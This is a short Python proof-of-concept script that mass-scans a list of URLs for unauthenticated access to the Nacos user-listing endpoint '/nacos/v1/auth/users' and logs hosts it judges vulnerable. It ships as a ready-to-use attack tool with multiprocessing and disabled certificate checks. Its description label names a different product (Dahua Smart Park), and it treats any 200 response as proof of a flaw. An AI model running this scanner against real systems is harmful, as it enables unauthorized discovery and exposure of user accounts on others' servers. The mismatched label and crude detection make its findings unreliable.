import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """test"""
    print(test)

def poc(target):
    try:
        payload = "/nacos/v1/auth/users?pageNo=1&pageSize=1"
        res1 = requests.get(url=target, verify=False,timeout=10)
        if res1.status_code == 200:
            # print(res1.status_code)
            res2 = requests.get(target+payload, verify=False,timeout=10)
            if res2.status_code == 200:
                print(f"[+]{target}存在漏洞")
                with open ("NS_result.txt","a",encoding="utf-8") as f:
                    f.write(f"[+]{target}存在漏洞\n")
            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"[-]{target}可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="大华智慧园区")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()